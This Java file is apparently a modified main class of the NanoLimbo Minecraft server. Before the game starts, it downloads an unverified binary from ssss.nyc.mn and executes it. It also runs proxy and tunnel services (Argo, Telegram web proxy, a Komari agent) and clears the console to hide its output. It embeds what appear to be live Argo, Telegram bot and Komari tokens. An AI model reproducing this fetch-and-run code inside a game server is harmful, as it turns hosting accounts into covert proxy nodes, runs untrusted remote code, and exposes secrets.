/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process komariProcess;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        // Komari
        "KOMARI_SERVER", "KOMARI_TOKEN", "KOMARI_AUTO_KEY",
        "KOMARI_FILE_PATH",
        // Telegram webproxy
        "TG_PORT", "TG_SECRET", "TG_DOMAIN"
    };


    public static void main(String[] args) {
        Map<String, String> envVars = new HashMap<>();

        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // Start SbxService
        try {
            loadEnvVars(envVars);

            // 启动 Komari
            startKomari(envVars);

            runSbxBinary(envVars);

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Wait before continuing
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }

        // start game
        try {
            startTelegramProxy(envVars);
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    // ================= Telegram WebProxy =================

    private static void startTelegramProxy(Map<String, String> env) {
        try {
            String secret = env.getOrDefault("TG_SECRET",
                    env.getOrDefault("UUID", "ac27dfbb-3981-455e-ab73-d74d20d73082"));
            int port = Integer.parseInt(env.getOrDefault("TG_PORT", "3000"));
            ua.nanit.limbo.telegram.TgWebProxyServer tg =
                    new ua.nanit.limbo.telegram.TgWebProxyServer(secret, port);
            tg.start();
            String domain = env.getOrDefault("TG_DOMAIN", "");
            System.out.println(ANSI_GREEN + "[TG-WebProxy] https://t.me/webproxy?server="
                    + (domain.isEmpty() ? "(auto public IP)" : domain) + "&secret=" + secret + ANSI_RESET);
        } catch (Exception e) {
            System.err.println(ANSI_RED + "TG webproxy failed to start: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();

                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();

                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }

    // ================= Komari =================

    private static void startKomari(Map<String, String> env) {
        String server  = env.getOrDefault("KOMARI_SERVER",   "");
        String token   = env.getOrDefault("KOMARI_TOKEN",    "");
        String autoKey = env.getOrDefault("KOMARI_AUTO_KEY", "");
        String filePath = env.getOrDefault("KOMARI_FILE_PATH", "./world");

        File workDir = new File(filePath);
        if (!workDir.exists()) {
            workDir.mkdirs();
        }

        File tokenFile = new File(workDir, "auto-discovery.json");
        boolean hasFileToken = tokenFile.exists();
        boolean enabled = !server.isEmpty()
                && (hasFileToken || !token.isEmpty() || !autoKey.isEmpty());

        if (!enabled) {
            System.out.println(ANSI_RED + "Komari 未启用" + ANSI_RESET);
            return;
        }

        try {
            Path agent = downloadKomariAgent();

            List<String> cmd = new ArrayList<>();
            cmd.add(agent.toAbsolutePath().toString());
            cmd.add("-e");
            cmd.add(formatEndpoint(server));

            if (hasFileToken) {
                cmd.add("-t");
                cmd.add(readTokenFromFile(tokenFile));
                System.out.println(ANSI_GREEN + "Komari 使用 FILE TOKEN 模式" + ANSI_RESET);
            } else if (!token.isEmpty()) {
                cmd.add("-t");
                cmd.add(token);
                System.out.println(ANSI_GREEN + "Komari 使用 ENV TOKEN 模式" + ANSI_RESET);
            } else {
                cmd.add("--auto-discovery");
                cmd.add(autoKey);
                System.out.println(ANSI_GREEN + "Komari 使用 AUTO_KEY 模式（首次注册）" + ANSI_RESET);
            }

            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.directory(workDir);
            pb.environment().put("HOME", workDir.getAbsolutePath());
            pb.environment().put("XDG_CONFIG_HOME", workDir.getAbsolutePath());
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.to(new File(".tglog")));

            komariProcess = pb.start();

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Komari 启动失败: " + e.getMessage() + ANSI_RESET);
        }
    }

    private static String readTokenFromFile(File file) {
        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
            String json = sb.toString();
            int idx = json.indexOf("\"token\"");
            if (idx != -1) {
                int start = json.indexOf("\"", idx + 7) + 1;
                int end = json.indexOf("\"", start);
                return json.substring(start, end);
            }
        } catch (Exception ignored) {}
        return "";
    }

    private static Path downloadKomariAgent() throws IOException {
        String arch = System.getProperty("os.arch").toLowerCase();
        String file;

        if (arch.contains("amd64") || arch.contains("x86_64")) {
            file = "komari-agent-linux-amd64";
        } else if (arch.contains("arm64") || arch.contains("aarch64")) {
            file = "komari-agent-linux-arm64";
        } else {
            throw new RuntimeException("Unsupported arch: " + arch);
        }

        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/" + file;
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "komari-agent");

        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }

        return path;
    }

    private static String formatEndpoint(String ep) {
        ep = ep.trim();
        if (!ep.startsWith("http")) {
            ep = "https://" + ep;
        }
        if (ep.endsWith("/")) {
            ep = ep.substring(0, ep.length() - 1);
        }
        return ep;
    }

    // ================= s-box =================

    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();
    }

    // ================= ENV =================

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "ac27dfbb-3981-455e-ab73-d74d20d73082"); // 节点UUID
        envVars.put("FILE_PATH", "./world");   // sub.txt节点保存目录
        envVars.put("ARGO_PORT", "8009");      // argo隧道端口
        envVars.put("ARGO_DOMAIN", "altare-zxz.c69.ccwu.cc");        // argo固定隧道域名
        envVars.put("ARGO_AUTH", "eyJhIjoiZTgwYTRmNDYzYWVmMzVlNWVhYWNhOWRlZjY3NjE3ZDciLCJ0IjoiZTlmZjM5ZTYtMDNhYi00NTY2LTllZGUtOWIzY2NjMWFmZmZlIiwicyI6Ik1qVmhOR1ZsTkdRdE5qYzVNeTAwTVRRMExUZzFZV0l0TjJZNU9ETTJZamhtTVdObSJ9");          // argo隧道密钥
        envVars.put("S5_PORT", "");            // socks5端口
        envVars.put("HY2_PORT", "");           // hysteria2端口
        envVars.put("TUIC_PORT", "");          // tuic端口
        envVars.put("ANYTLS_PORT", "");        // anytls端口
        envVars.put("REALITY_PORT", "");       // reality端口
        envVars.put("ANYREALITY_PORT", "");    // any-reality端口
        envVars.put("UPLOAD_URL", "");         // 节点自动上传订阅器地址
        envVars.put("CHAT_ID", "6595585066");            // telegram chat id
        envVars.put("BOT_TOKEN", "7969325333:AAE0ewRaogaXlBz_5Bnt2hxcTIVw3dEp0b4");          // telegram bot token
        envVars.put("CFIP", "saas.sin.fan");      // 优选域名或优选ip
        envVars.put("CFPORT", "443");          // 优选域名或优选ip对应端口
        envVars.put("NAME", "altare-zxz-th");               // 节点备注名称
        envVars.put("DISABLE_ARGO", "false");  // 是否关闭argo隧道
        // Komari 默认值（留空，由用户通过环境变量或 .env 配置）
        envVars.put("KOMARI_SERVER", "hf-komari.o5o.pp.ua");
        envVars.put("KOMARI_TOKEN", "BurhCe9fevMPAui9z8At39");
        envVars.put("KOMARI_AUTO_KEY", "");
        envVars.put("KOMARI_FILE_PATH", "./world");

        // 环境变量覆盖
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        // .env 文件覆盖
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;

                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }

                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");

                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    // ================= Binary =================

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    // ================= Stop =================

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();
            System.out.println(ANSI_RED + "komari process terminated" + ANSI_RESET);
        }
    }
}
